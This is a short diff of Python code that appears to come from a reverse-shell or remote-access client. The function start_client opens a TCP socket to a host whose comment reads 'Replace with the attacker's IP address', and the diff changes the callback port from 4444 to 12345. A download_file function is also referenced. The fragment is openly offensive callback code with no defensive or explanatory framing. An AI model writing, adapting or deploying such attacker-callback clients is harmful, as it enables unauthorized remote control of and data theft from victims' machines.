@@ -45,7 +45,7 @@ def download_file(url):
 
 def start_client():
     host = '192.168.68.118'  # Replace with the attacker's IP address
-    port = 4444  # Port to connect to
+    port = 12345  # Port to connect to
 
     client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     client_socket.connect((host, port))
